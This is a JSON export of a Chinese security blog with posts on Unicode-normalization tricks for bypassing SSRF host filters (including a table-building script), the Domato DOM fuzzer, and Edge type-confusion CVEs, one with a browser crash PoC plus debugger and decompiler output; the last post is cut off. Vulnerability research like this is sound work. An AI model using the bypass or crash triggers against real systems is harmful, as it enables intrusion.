{"meta":{"title":"Lyle's Blog","subtitle":null,"description":null,"author":"Lyle","url":"https://LyleMi.github.io"},"pages":[],"posts":[{"title":"Unicode等价性浅谈","slug":"unicode-normalization","date":"2018-10-29T08:56:53.000Z","updated":"2018-11-27T01:56:14.951Z","comments":true,"path":"2018/10/29/unicode-normalization/","link":"","permalink":"https://LyleMi.github.io/2018/10/29/unicode-normalization/","excerpt":"做SSRF测试的时候，常提到用类似 ａ 字符来bypass过滤器，之前没有做深究，偶然的一次机会，发现bａidu.com(\\uff41)能跳转到百度，但是bаidu.com(\\u0430)会被认为是一个新的IDN域名，并不指向baidu.com。","text":"做SSRF测试的时候，常提到用类似 ａ 字符来bypass过滤器，之前没有做深究，偶然的一次机会，发现bａidu.com(\\uff41)能跳转到百度，但是bаidu.com(\\u0430)会被认为是一个新的IDN域名，并不指向baidu.com。 先在浏览器中打开工具调试，发现第一个case在HTTP包中的Host字段的值是baidu.com，那么应该是先处理过再发送的请求。 想到了其中可能会有编码转换，简单看了一下IDN的RFC没有找到有价值的信息，于是开始找源码，以idna为关键字在WebKit的源码中找到相关函数 uidna_nameToUnicode ，在Chromium中也找到这个函数。 顺着关键字找到icu标准的实现，其在官方网站上很清楚的给出了转换的demo和浏览器normalize的demo，那么使用其进行测试。 bａidu.com测试结果入下： bаidu.com测试结果入下： 从上面这个结果可以看到\\uff41在某些模式下会被转换，而\\u0430在所有模式下都不会被转换，那么到这里这个问题已经有一个初步的答案了，第一个case被normalize转换为ascii，所以能正常解析。第二个case不会被转换，被做为unicode处理，所以会访问IDN域名。 但是这个答案还不够清晰，于是继续顺着线索找到unicode转换的标准。标准中提到，两个不同编码的Unicode字符可能存在一定的等价性，这种等价是字符或字符序列之间比较弱的等价类型，这些变体形式可能代表在某些字体或语境中存在视觉上或意义上的相似性。举例来说，a 和ａ(\\uff41)在某些字体下看起来可能相同，15和⑮(\\u246e)其表示的数学意义可能相同，所以这两种字符都有其相应的等价性，这种等价性是由人为规定的。更具体的说明可以参考wiki。 转换组成字符的方式有 Normalization Form C 和 Normalization Form KC 两种，它们之间的区别取决于生成的文本是否与原始非标准化文本等效，其中K用于表示兼容性。同理，分解组成字符的方式也有Normalization Form D 和 Normalization Form KD 两种。那么NFC和NFD的区别是什么呢，举例来说，Å(\\u212B)用NFD进行normalize，会变为Å(\\u0041\\u030a)，而NFC处理后则是Å(\\u00c5)。在normalize的时候，会检测字符是否在NFC表中，如果在则进行对应的转换算法。回到之前的问题，\\uff41会被normalize，而\\u0430不被normalize，在请求时因为其中包含unicode字符，所以会被认为是IDN域名。 到此为止，开头的问题已经基本清楚了。在接下来，想构造字符对应的等效码表，来为平时的测试服务。以简单考虑，这里不对icu的代码做深究，一个简单的想法是，对所有字符遍历一次，寻找normalize后相等的字符即可。那么一个简单的获取可打印ascii字符的等效字符的脚本如下： 1234567891011121314151617181920212223242526272829303132#!/usr/bin/env python# -*- coding: utf-8 -*-import jsonfrom unicodedata import normalizedef main(): debug = False tables = &#123;&#125; for i in range(1, 0x10000): src = unichr(i) dst = normalize('NFKC', src)[0] try: if ord(dst) &lt; 128 and dst != src: if debug: print(\"%s (\\\\u%s) -- normalize --&gt; %s (\\\\x%s)\" % ( src, hex(i)[2:].rjust(4, '0'), dst, hex(dst.charAt(0))[2:] )) if dst in tables: tables[dst].append(src) else: tables[dst] = [src] except Exception as e: print(repr(e)) with open(\"nfctable.txt\", \"wb\") as fh: json.dump(tables, fh)if __name__ == '__main__': main()","categories":[],"tags":[]},{"title":"Domato - A DOM Fuzzer","slug":"2017-9-27-domato-dom-fuzzer","date":"2017-09-27T01:31:40.000Z","updated":"2018-11-27T01:56:09.108Z","comments":true,"path":"2017/09/27/2017-9-27-domato-dom-fuzzer/","link":"","permalink":"https://LyleMi.github.io/2017/09/27/2017-9-27-domato-dom-fuzzer/","excerpt":"0x00 概述Domato是Google Project Zero的研究员实现的一套DOM Fuzz工具，该Fuzzer挖掘出了30+来自各浏览器的漏洞，是一款比较高效的Fuzzer。 其基本思路和正常的fuzzer一样，也是利用从各个地方抓取的HTML/CSS/JS样本中所包含的语法结构和属性来生成样本。 整个fuzzer大概可以分为以下几个部分： generator.py 根据输入的语法生成样本的引擎 grammar.py 解析参数然后调用基础引擎来生成样本 *.txt 用于生成HTML，CSS，js代码的语法库","text":"0x00 概述Domato是Google Project Zero的研究员实现的一套DOM Fuzz工具，该Fuzzer挖掘出了30+来自各浏览器的漏洞，是一款比较高效的Fuzzer。 其基本思路和正常的fuzzer一样，也是利用从各个地方抓取的HTML/CSS/JS样本中所包含的语法结构和属性来生成样本。 整个fuzzer大概可以分为以下几个部分： generator.py 根据输入的语法生成样本的引擎 grammar.py 解析参数然后调用基础引擎来生成样本 *.txt 用于生成HTML，CSS，js代码的语法库 0x01 代码代码主要完成根据语法生成代码的功能，主要的代码是generator.py和grammar.py，另外的都是语法文件。 语法语法文件是domato的一个重要的部分，这部分作者提到的产生方式为两步。首先从Chrome的源文件中抽取出.idl文件，然后从Chrome的测试文件中提取出了一些常见的HTML和CSS语法。在提取出这些属性之后，还有很大范围的人工的改动，使得这些特征更容易触发bug。 完成后，作者并没有使用常见的json或者xml来定义，而是自己自定义了一种语法格式。其基本的语法是这样的： 1&lt;symbol&gt; = a mix of constants and &lt;other_symbol&gt;s 每一条语法规则都包含一个左值和一个右值，左值是一个符号，右值是符号/常量及其组合。在生成样本时，右值都会递归的展开。 一个最简单的例子如下 1234&lt;cssrule&gt; = &lt;selector&gt; &#123; &lt;declaration&gt; &#125;&lt;selector&gt; = a&lt;selector&gt; = b&lt;declaration&gt; = width:100% 这里可能生成的样本就是 a { width:100% } 或者 b { width:100% } 这里在定义symbol的同时还可以定义一些附加的属性，比如 12&lt;selector p=0.9&gt; = a&lt;selector p=0.1&gt; = b 这里表示a出现的概率为0.1，如果不特别声明，则概率是相差不多的 代码语法用于生成代码的语法和普通的语法相差不大，但是引入了更多的规则来使得可以生成更灵活的脚本。还是看作者给出的例子 1234567!varformat fuzzvar%05d!lineguard try &#123; &lt;line&gt; &#125; catch(e) &#123;&#125;!begin lines&lt;new element&gt; = document.getElementById(&quot;&lt;string min=97 max=122&gt;&quot;);&lt;element&gt;.doSomething();!end lines 调用脚本生成一个5行的样本，得到的结果为 12345try &#123; var00001 = document.getElementById(\"hw\"); &#125; catch(e) &#123;&#125;try &#123; var00001.doSomething(); &#125; catch(e) &#123;&#125;try &#123; var00002 = document.getElementById(\"feezcqbndf\"); &#125; catch(e) &#123;&#125;try &#123; var00002.doSomething(); &#125; catch(e) &#123;&#125;try &#123; var00001.doSomething(); &#125; catch(e) &#123;&#125; 写一个代码的语法规则要注意的是下面这些点： 每一行都由!begin lines和!end lines包裹 这里用了&lt;new element&gt;而不是&lt;element&gt;，表示生成了一个变量 generator.pygenerator.py是主文件，其调用了grammar.py作为库，另外包含一些辅助生成样本的函数，大概的逻辑流程如下： GenerateSamples read template and grammar files add html grammar =&gt; html.txt import css grammar add js grammar =&gt; js.txt import css grammar add css grammar =&gt; css.txt GenerateNewSample with args (template html css js) AddHTMLIDs =&gt; 随机生成一些html元素的id，用于js/css GenerateHTMLElements =&gt; 调用库生成html及css，保存相关信息 GenerateFunctionBody =&gt; 根据之前保存的信息生成js代码 grammar.pygrammar.py实现了一个通用的语法库，也就是说除了该fuzzer，还适用于其他的生成的库。其大概流程如下： ParseFromString =&gt; 读取文件 IncludeFromString =&gt; 保存规则 SaveFunction ParseCodeLine ParseGrammarLine ParseTagAndAttributes NormalizeProbabilities =&gt; 根据概率随机生成样本 GetCDF ComputeInterestingIndices 其调用也比较简单，一个简单的demo如下 12345from grammar import Grammarmy_grammar = Grammar()my_grammar.ParseFromFile('input_file.txt')result_string = my_grammar.GenerateSymbol('symbol_name') 这里就调用input_file.txt中的语法生成了symbol_name中的元素 0x02 参考链接 pj0 blog github","categories":[{"name":"browser fuzz","slug":"browser-fuzz","permalink":"https://LyleMi.github.io/categories/browser-fuzz/"}],"tags":[]},{"title":"CVE-2017-8496 Edge Type confusion","slug":"2017-8-14-cve-2017-8496","date":"2017-08-14T01:31:40.000Z","updated":"2018-11-27T01:56:00.171Z","comments":true,"path":"2017/08/14/2017-8-14-cve-2017-8496/","link":"","permalink":"https://LyleMi.github.io/2017/08/14/2017-8-14-cve-2017-8496/","excerpt":"1. Vulnerability Description1.1 The Issue崩溃发生在CAttrArray::PrivateFindInl函数中。 在函数中rcx（this）指针应该指向一个CAttrArray，但它实际上指向一个CAttribute。CAttrArray::PrivateFindInl只会执行读取操作，其返回值将被调用函数（CAttrArray::SetParsed）抛弃。","text":"1. Vulnerability Description1.1 The Issue崩溃发生在CAttrArray::PrivateFindInl函数中。 在函数中rcx（this）指针应该指向一个CAttrArray，但它实际上指向一个CAttribute。CAttrArray::PrivateFindInl只会执行读取操作，其返回值将被调用函数（CAttrArray::SetParsed）抛弃。 1.2 Affect versionWindows 10 Enterprise 64-bit (OS version 1607, OS build 14393.1198)Microsoft Edge 38.14393.1066.0, Microsoft EdgeHTML 14.14393. 1.3 Timeline01/12/2016 Advisory disclosed01/12/2016 +0 days Countermeasure disclosed01/12/2016 +0 days SecurityTracker entry created01/12/2016 +0 days VulnerabilityCenter entry assigned01/13/2016 +1 days VulnerabilityCenter entry created01/14/2016 +1 days VulDB entry created01/17/2016 +3 days VulnerabilityCenter entry updated01/19/2016 +2 days VulDB last update 2. Technical description and PoC2.1 Crash从Google Project Zero的报告中获取的PoC如下 123456789&lt;!-- saved from url=(0014)about:internet --&gt;&lt;script&gt;function go() &#123; window.addEventListener(\"DOMAttrModified\", undefined); m.style.cssText = \"clip-path: url(#foo);\";&#125;&lt;/script&gt;&lt;body onload=go()&gt;&lt;meter id=\"m\" value=\"a\" frame=\"below\"&gt; WinDBG attach到Edge上，运行PoC，发现Crash（注：这里用了一款Edge专用的辅助Debug的工具，可以比较方便的在命令行直接attach到进程上。） 12edgehtml!CAttrArray::PrivateFindInl+0xd6:00007ffa`3b9e04b6 41f644d00380 test byte ptr [r8+rdx*8+3],80h ds:00000003`0005ffbe=?? 可以看出，这里是引用了一个无效的指针，此时的调用栈如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960611:048&gt; k # Child-SP RetAddr Call Site00 00000013`84bfad60 00007ffa`3bbaccc9 edgehtml!CAttrArray::PrivateFindInl+0xd601 00000013`84bfad90 00007ffa`3bb1a68b edgehtml!CAttrArray::SetParsed+0x4902 00000013`84bfae00 00007ffa`3bb1c40c edgehtml!CssParser::RecordProperty+0x24b03 00000013`84bfae70 00007ffa`3bb1b10c edgehtml!CssParser::HandleSingleDeclaration+0x21c04 00000013`84bfaef0 00007ffa`3bae026b edgehtml!CssParser::HandleDeclaration+0x9c05 00000013`84bfaf20 00007ffa`3badedaa edgehtml!CssParser::Write+0x3b06 00000013`84bfaf60 00007ffa`3b93165c edgehtml!ProcessCSSText+0x11207 00000013`84bfafe0 00007ffa`3b94aae3 edgehtml!CStyle::SetCssText+0xbc08 00000013`84bfb020 00007ffa`3bc2ed85 edgehtml!CFastDOM::CCSSStyleDeclaration::Trampoline_Set_cssText+0x7709 00000013`84bfb070 00007ffa`3af6c35b edgehtml!CFastDOM::CCSSStyleDeclaration::Profiler_Set_cssText+0x250a 00000013`84bfb0a0 00007ffa`3af34460 chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x16b0b 00000013`84bfb180 00007ffa`3aed6d09 chakra!Js::LeaveScriptObject&lt;1,1,0&gt;::LeaveScriptObject&lt;1,1,0&gt;+0x1800c 00000013`84bfb1d0 00007ffa`3aed44ae chakra!Js::JavascriptOperators::CallSetter+0xa90d 00000013`84bfb270 00007ffa`3aed4be2 chakra!Js::JavascriptOperators::SetProperty_Internal&lt;0&gt;+0x4de0e 00000013`84bfb330 00007ffa`3aed4b1f chakra!Js::JavascriptOperators::OP_SetProperty+0xa20f 00000013`84bfb380 00007ffa`3af8c1fb chakra!Js::JavascriptOperators::PatchPutValueWithThisPtrNoFastPath+0x9f10 00000013`84bfb400 00007ffa`3aec1ca0 chakra!Js::ProfilingHelpers::ProfiledStFld&lt;0&gt;+0x1cb11 00000013`84bfb4d0 00007ffa`3aec6a50 chakra!Js::InterpreterStackFrame::OP_ProfiledSetProperty&lt;Js::OpLayoutT_ElementCP&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; const &gt;+0x7012 00000013`84bfb520 00007ffa`3aec4aa2 chakra!Js::InterpreterStackFrame::ProcessProfiled+0x34013 00000013`84bfb5b0 00007ffa`3aec8b5e chakra!Js::InterpreterStackFrame::Process+0x14214 00000013`84bfb610 00007ffa`3aeca265 chakra!Js::InterpreterStackFrame::InterpreterHelper+0x48e15 00000013`84bfb950 00000176`dcdc0fb2 chakra!Js::InterpreterStackFrame::InterpreterThunk+0x5516 00000013`84bfb9a0 00007ffa`3aff1393 0x00000176`dcdc0fb217 00000013`84bfb9d0 00007ffa`3aebd873 chakra!amd64_CallFunction+0x9318 00000013`84bfba20 00007ffa`3aec0490 chakra!Js::JavascriptFunction::CallFunction&lt;1&gt;+0x8319 00000013`84bfba80 00007ffa`3aec4f4d chakra!Js::InterpreterStackFrame::OP_CallI&lt;Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallI&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt; &gt;+0x1101a 00000013`84bfbad0 00007ffa`3aec4b07 chakra!Js::InterpreterStackFrame::ProcessUnprofiled+0x32d1b 00000013`84bfbb60 00007ffa`3aec8b5e chakra!Js::InterpreterStackFrame::Process+0x1a71c 00000013`84bfbbc0 00007ffa`3aeca265 chakra!Js::InterpreterStackFrame::InterpreterHelper+0x48e1d 00000013`84bfbf00 00000176`dcdc0fba chakra!Js::InterpreterStackFrame::InterpreterThunk+0x551e 00000013`84bfbf50 00007ffa`3aff1393 0x00000176`dcdc0fba1f 00000013`84bfbf80 00007ffa`3aebd873 chakra!amd64_CallFunction+0x9320 00000013`84bfbfd0 00007ffa`3af2c2ec chakra!Js::JavascriptFunction::CallFunction&lt;1&gt;+0x8321 00000013`84bfc030 00007ffa`3af2b8b6 chakra!Js::JavascriptFunction::CallRootFunctionInternal+0x10422 00000013`84bfc120 00007ffa`3afd6259 chakra!Js::JavascriptFunction::CallRootFunction+0x4a23 00000013`84bfc190 00007ffa`3af31d41 chakra!ScriptSite::CallRootFunction+0xb524 00000013`84bfc230 00007ffa`3af2d8fc chakra!ScriptSite::Execute+0x13125 00000013`84bfc2c0 00007ffa`3bb3278d chakra!ScriptEngineBase::Execute+0xcc26 00000013`84bfc360 00007ffa`3bb326d8 edgehtml!CJScript9Holder::ExecuteCallbackDirect+0x3d27 00000013`84bfc3b0 00007ffa`3bb431f7 edgehtml!CJScript9Holder::ExecuteCallback+0x1828 00000013`84bfc3f0 00007ffa`3bb42fe7 edgehtml!CListenerDispatch::InvokeVar+0x1fb29 00000013`84bfc570 00007ffa`3bb310da edgehtml!CListenerDispatch::Invoke+0xdb2a 00000013`84bfc5f0 00007ffa`3bbc1602 edgehtml!CEventMgr::_InvokeListeners+0x2ca2b 00000013`84bfc750 00007ffa`3ba9a495 edgehtml!CEventMgr::_InvokeListenersOnWindow+0x662c 00000013`84bfc780 00007ffa`3ba99f23 edgehtml!CEventMgr::Dispatch+0x4052d 00000013`84bfca50 00007ffa`3bad00c2 edgehtml!CEventMgr::DispatchEvent+0x732e 00000013`84bfcaa0 00007ffa`3bb0296a edgehtml!COmWindowProxy::Fire_onload+0x14e2f 00000013`84bfcbb0 00007ffa`3bb01596 edgehtml!CMarkup::OnLoadStatusDone+0x37630 00000013`84bfcc70 00007ffa`3bb46d7f edgehtml!CMarkup::OnLoadStatus+0x11231 00000013`84bfcca0 00007ffa`3bb2859d edgehtml!CProgSink::DoUpdate+0x3af32 00000013`84bfd130 00007ffa`3bb29d70 edgehtml!GlobalWndOnMethodCall+0x24d33 00000013`84bfd230 00007ffa`593e1c24 edgehtml!GlobalWndProc+0x13034 00000013`84bfd2f0 00007ffa`593e156c user32!UserCallWinProcCheckWow+0x27435 00000013`84bfd450 00007ffa`380ec781 user32!DispatchMessageWorker+0x1ac36 00000013`84bfd4d0 00007ffa`380eec41 EdgeContent!CBrowserTab::_TabWindowThreadProc+0x4a137 00000013`84bff720 00007ffa`4f7b9266 EdgeContent!LCIETab_ThreadProc+0x2c138 00000013`84bff840 00007ffa`59d98364 iertutil!SettingStore::CSettingsBroker::SetValue+0x24639 00000013`84bff870 00007ffa`59f55e91 KERNEL32!BaseThreadInitThunk+0x143a 00000013`84bff8a0 00000000`00000000 ntdll!RtlUserThreadStart+0x21 寄存器的值如下 1234567891:048&gt; rrax=0000000000003ffd rbx=0000000000000002 rcx=00000176d9804cf0rdx=000000000000bff7 rsi=0000000000003ffd rdi=0000000000000000rip=00007ffa3b9e04b6 rsp=0000001384bfad60 rbp=0000000000000002 r8=0000000300000003 r9=00000000800114a4 r10=0000000000000000r11=0000000000007ffa r12=00000176d9a9c680 r13=00000176d9734b01r14=00000176d9804c88 r15=0000000000000000iopl=0 nv up ei pl nz na pe nccs=0033 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010202 在ida中查看相关的代码: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139int __fastcall CAttrArray::PrivateFindInl(__int64 this, int a2, signed int CAttrValue__AATYPE)&#123; signed int v3; // edi@1 signed int v4; // er10@1 int v5; // er9@1 __int64 this_add_4; // r11@4 __int64 this_add_8; // r8@4 signed int v8; // ebx@4 unsigned __int64 v9; // rax@7 signed __int64 v10; // rdx@7 unsigned __int64 v11; // r11@8 int v12; // ecx@10 signed int v13; // ecx@16 __int64 v14; // rsi@22 int v15; // ecx@23 signed int v16; // ecx@34 signed int v17; // esi@38 signed __int64 v18; // rdx@38 int v19; // ecx@40 int v21; // [sp+38h] [bp+10h]@20 v3 = 0; v4 = CAttrValue__AATYPE; v5 = a2; if ( CAttrValue__AATYPE == 6 ) v4 = 0; if ( a2 == -1 ) &#123; v21 = -1; LODWORD(v9) = CAttrArray::PrivateFindLinear(this, (unsigned int)v4, &amp;v21, 0xFFFFFFFFi64); &#125; else &#123; this_add_4 = *(_DWORD *)(this + 4); this_add_8 = *(_QWORD *)(this + 8); v8 = 2; if ( v4 &gt; 2 ) v8 = v4; if ( (signed int)this_add_4 &lt; 11 ) &#123; v9 = *(_QWORD *)(this + 8); v10 = 3 * this_add_4; goto LABEL_8; &#125; if ( (signed int)this_add_4 &gt; 0 ) &#123; while ( 1 ) &#123; v14 = ((signed int)this_add_4 + v3) / 2; v9 = this_add_8 + 24 * v14; if ( *(_BYTE *)(this_add_8 + 24 * v14 + 3) &amp; 0x80 )// vuln v15 = *(_DWORD *)(v9 + 8); else v15 = *(_DWORD *)(*(_QWORD *)(v9 + 8) + 48i64); if ( a2 &lt; v15 ) &#123; LODWORD(this_add_4) = ((signed int)this_add_4 + v3) / 2; goto LABEL_26; &#125; if ( a2 &gt; v15 ) goto LABEL_30; v16 = *(_BYTE *)v9; if ( v4 == v16 ) return v9; if ( v8 &gt;= v16 ) break; LODWORD(this_add_4) = ((signed int)this_add_4 + v3) / 2;LABEL_26: if ( (signed int)this_add_4 - v3 &lt; 10 ) &#123; v9 = this_add_8 + 24i64 * v3; goto LABEL_28; &#125; if ( v3 &gt;= (signed int)this_add_4 ) goto LABEL_19; &#125; if ( v8 == 2i64 ) &#123; v17 = v14 - 1; v18 = v9 - 24; if ( v17 &gt;= v3 ) &#123; while ( 1 ) &#123; v19 = *(_BYTE *)(v18 + 3) &amp; 0x80 ? *(_DWORD *)(v18 + 8) : *(_DWORD *)(*(_QWORD *)(v18 + 8) + 48i64); if ( v5 != v19 ) break; if ( v4 == *(_BYTE *)v18 ) &#123; LODWORD(v9) = v18; return v9; &#125; if ( v17 != v3 ) &#123; v18 -= 24i64; if ( --v17 &gt;= v3 ) continue; &#125; break; &#125; &#125;LABEL_28: v10 = 3i64 * (signed int)this_add_4;LABEL_8: v11 = this_add_8 + 8 * v10; if ( v9 &lt; v11 ) &#123; while ( 1 ) &#123; if ( *(_BYTE *)(v9 + 3) &amp; 0x80 ) v12 = *(_DWORD *)(v9 + 8); else v12 = *(_DWORD *)(*(_QWORD *)(v9 + 8) + 48i64); if ( v12 &gt;= v5 ) &#123; if ( v12 != v5 ) goto LABEL_19; v13 = *(_BYTE *)v9; if ( v13 == v4 ) return v9; if ( v13 &gt; v8 ) goto LABEL_19; &#125; v9 += 24i64; if ( v9 &gt;= v11 ) goto LABEL_19; &#125; &#125; goto LABEL_19; &#125;LABEL_30: v3 = v14 + 1; goto LABEL_26; &#125;LABEL_19: LODWORD(v9) = 0; &#125; return v9;&#125; 其中引发问题的指令是 1if ( *(_BYTE *)(this_add_8 + 24 * v14 + 3) &amp; 0x80 ) 其中this_add_8变量对应的是 rcx+8 那么先查看下rcx的值 12345678910111213141516171:048&gt; dps rcx00000176`d9804cf0 00007ffa`3c562d38 edgehtml!CAttribute::`vftable&apos;00000176`d9804cf8 00000003`0000000300000176`d9804d00 00000000`0000000800000176`d9804d08 00000000`0000000000000176`d9804d10 00000000`0000000000000176`d9804d18 00000176`dcc1815000000176`d9804d20 00007ffa`3c55fae0 edgehtml!s_propdescCElementstyle_Str00000176`d9804d28 00000000`800103eb00000176`d9804d30 00000176`d9a742f400000176`d9804d38 00000000`0000000000000176`d9804d40 00000000`0000000000000176`d9804d48 00000000`0000000000000176`d9804d50 00000176`d982850000000176`d9804d58 00000176`d98a858000000176`d9804d60 00000176`d9850c0000000176`d9804d68 00000176`d983c330 这里rcx是this指针，在CAttrArray::PrivateFindInl这个类的函数中应该是一个CAttrArray对象的this指针，可是这里rcx存了一个CAttribute的虚表对象，也就是说，在之前有一个错误的调用。 那么根据调用栈继续上溯，我们可以看到CAttrArray::SetParsed函数，调用PrivateFindInl的代码如下 123456if ( v6 || (v8 = *a1) == 0i64 || (LODWORD(v9) = CAttrArray::PrivateFindInl((__int64)v8, a2, 0), !v9) )&#123; v11 = v4; v10 = 31; CAttrArray::Set(v7, (unsigned int)v5, &amp;v10, 0i64);&#125; 也就是说这里如果该函数返回错误的值，那么CAttrArray::Set将不会执行。 继续向上回溯，查看CssParser::RecordProperty函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167void __fastcall CssParser::RecordProperty(CssParser *this, struct CssTokenizer *a2, __int32 a3, char a4, bool a5)&#123; char v5; // si@1 __int32 v6; // edi@1 struct CssTokenizer *v7; // r14@1 CssParser *v8; // rbp@1 CBase *v9; // rcx@3 char v10; // bl@4 bool v11; // r15@4 bool v12; // al@6 char v13; // r13@9 unsigned __int8 v14; // bl@10 MemoryProtection *v15; // rsi@11 const unsigned __int16 *v16; // r12@11 __int32 v17; // er8@13 __int64 v18; // rcx@18 const unsigned __int16 *v19; // rdi@18 unsigned __int64 v20; // rsi@18 __int64 v21; // rax@18 __int16 v22; // ax@24 unsigned __int64 v23; // r14@30 signed __int64 v24; // r14@31 const struct PROPERTYDESC *v25; // rax@37 int v26; // er10@37 CDoc *v27; // rax@44 const unsigned __int16 *v28; // rdx@51 unsigned __int16 *v29[2]; // [sp+20h] [bp-48h]@4 __int64 v30; // [sp+30h] [bp-38h]@4 __int32 v31; // [sp+80h] [bp+18h]@1 v31 = a3; v5 = a4; v6 = a3; v7 = a2; v8 = this; if ( *((_UNKNOWN **)this + 22) == &amp;CCSSStyleDeclaration::s_apHdlDescs &amp;&amp; *((_QWORD *)this + 2) ) &#123; v9 = (CBase *)*((_QWORD *)this + 23); if ( !v9 ) &#123;LABEL_4: v10 = 0; v30 = 0i64; _mm_storeu_si128((__m128i *)v29, 0i64); v11 = v6 == -1; v12 = v5 || v11; if ( a5 || v12 ) &#123; v13 = 1; if ( v12 ) v10 = -128; &#125; else &#123; v13 = 0; &#125; v14 = v10 | 8; if ( !v13 ) &#123;LABEL_11: v15 = (MemoryProtection *)v29[0]; v16 = &amp;g_szEmpty; if ( v11 ) &#123; if ( v29[0] ) v28 = v29[0]; else v28 = &amp;g_szEmpty; if ( CssParser::GetExpandoDispID(v8, v28, &amp;v31) ) &#123;LABEL_15: if ( v15 ) MemoryProtection::HeapFree(v15, (void *)a2); return; &#125; v6 = v31; &#125; if ( v6 != -1 ) &#123; v17 = *((_DWORD *)v8 + 7) + 1; if ( (unsigned int)v17 &gt; *((_DWORD *)v8 + 6) &gt;&gt; 2 ) &#123; if ( v17 &lt; 0 ) &#123; Abandonment::InvalidArguments(); JUMPOUT(*(_QWORD *)&amp;byte_18042A78B); &#125; CImplAry::EnsureSizeWorker((CssParser *)((char *)v8 + 24), 4ui64, v17); &#125; *(_DWORD *)(*((_QWORD *)v8 + 4) + 4i64 * (*((_DWORD *)v8 + 7))++) = v6; if ( v13 ) &#123; if ( v11 ) &#123; CAttrArray::SetParsed(*((struct CAttrArray ***)v8 + 2), v31, &amp;pwzURI, v14); &#125; else &#123; v25 = GetStandardPropDescFromAliasDISPID(v31); if ( v25 ) v26 = *((_DWORD *)v25 + 12); if ( v15 ) v16 = (const unsigned __int16 *)v15; CAttrArray::SetParsed(*((struct CAttrArray ***)v8 + 2), v26, v16, v14); &#125; &#125; &#125; goto LABEL_15; &#125; v18 = *((_QWORD *)v7 + 1); v19 = (const unsigned __int16 *)*((_QWORD *)v7 + 5); v20 = v18 + 2i64 * *((_DWORD *)v7 + 5); v21 = *((_DWORD *)v7 + 4); if ( v20 &gt; v18 + 2 * v21 ) v20 = v18 + 2 * v21; if ( !v11 ) &#123; if ( (unsigned __int64)v19 &gt;= v20 ) &#123;LABEL_31: v24 = (signed __int64)(v20 - (_QWORD)v19) &gt;&gt; 1; if ( !v11 &amp;&amp; (unsigned int)v24 &gt;= 0xA &amp;&amp; !StrCmpNICW(v20 - 20, L\"!important\", 10i64) ) &#123; LODWORD(v24) = v24 - 10; v14 |= 2u; &#125; CBuffer::Append((CBuffer *)v29, v19, v24); CBuffer::TrimTrailingWhitespace((CBuffer *)v29); v6 = v31; goto LABEL_11; &#125; if ( 58 == *v19 ) ++v19; v22 = *(_WORD *)(v20 - 2); if ( v22 == 59 || !v22 || v22 == 125 ) v20 -= 2i64; &#125; if ( (unsigned __int64)v19 &lt; v20 ) &#123; while ( IsCharSpaceW(*v19) ) &#123; ++v19; if ( (unsigned __int64)v19 &gt;= v20 ) goto LABEL_31; &#125; if ( (unsigned __int64)v19 &lt; v20 ) &#123; do &#123; v23 = v20 - 2; if ( !IsCharSpaceW(*(_WORD *)(v20 - 2)) ) break; v20 -= 2i64; &#125; while ( (unsigned __int64)v19 &lt; v23 ); &#125; &#125; goto LABEL_31; &#125; v27 = CBase::GetCDoc(v9); if ( !v27 || CDoc::CheckCSSDiagnosticsAvailability(v27) ) &#123; v6 = v31; goto LABEL_4; &#125; &#125;&#125; CAttrArray::SetParsed的调用在下面两句： 1CAttrArray::SetParsed(*((struct CAttrArray ***)v8 + 2), v31, &amp;pwzURI, v14); 1CAttrArray::SetParsed(*((struct CAttrArray ***)v8 + 2), v26, v16, v14); 这里v8是this指针，也就是说在这里发生了一次错误的调用，本来应该传入的是CAttrArray，但是传入了一个CAttribute，造成了Type confusion 3. References1. project-zero 2. nvd 3. cve 4. seebug","categories":[{"name":"cve","slug":"cve","permalink":"https://LyleMi.github.io/categories/cve/"}],"tags":[]},{"title":"CVE-2016-0003 Edge Type Confusion","slug":"2017-8-11-cve-2016-0003","date":"2017-08-11T01:31:40.000Z","updated":"2018-11-27T01:55:56.797Z","comments":true,"path":"2017/08/11/2017-8-11-cve-2016-0003/","link":"","permalink":"https://LyleMi.github.io/2017/08/11/2017-8-11-cve-2016-0003/","excerpt":"1. Vulnerability Description1.1 The IssueMS Edge CDOMTextNode::get_data type confusion 特别构造的JavaScript脚本可以触发Microsoft Edge的type confusion，使得可以像访问字符串一样访问C++对象。 这可能导致信息泄露，例如允许攻击者确定指向其他对象或函数的指针的值。","text":"1. Vulnerability Description1.1 The IssueMS Edge CDOMTextNode::get_data type confusion 特别构造的JavaScript脚本可以触发Microsoft Edge的type confusion，使得可以像访问字符串一样访问C++对象。 这可能导致信息泄露，例如允许攻击者确定指向其他对象或函数的指针的值。 1.2 Affect versionMicrosoft Edge 20.10240.16384.0 1.3 Timeline01/12/2016 Advisory disclosed01/12/2016 +0 days Countermeasure disclosed01/12/2016 +0 days SecurityTracker entry created01/12/2016 +0 days VulnerabilityCenter entry assigned01/13/2016 +1 days VulnerabilityCenter entry created01/14/2016 +1 days VulDB entry created01/17/2016 +3 days VulnerabilityCenter entry updated01/19/2016 +2 days VulDB last update 2. Technical description and PoC2.1 Description在DOM树中将一个节点作为子节点加到另一个节点时，Edge首先从其父节点中删除该节点，触发DOMNodeRemoved事件，然后重新附加该节点作为另一个节点的最后一个子节点。而在DOMNodeRemoved事件发生时，JavaScript的事件处理器可以更改DOM树，我们尝试在触发DOMNodeRemoved事件时向同一个父节点插入另一个文本子节点，这个操作在事件期间完成，因此该文本子节点在触发事件的节点之前作为子节点附加。而在触发DOMNodeRemoved事件处理程序之前，代码似乎确定了节点应该被附加的位置，因此最开始插入的节点在父文本节点之前而不是之后被插入。因为bug的存在，在完成所有这些操作后，DOM树已被破坏。这可以通过检查文本节点的.nextSibling属性是文本节点本身来确认, 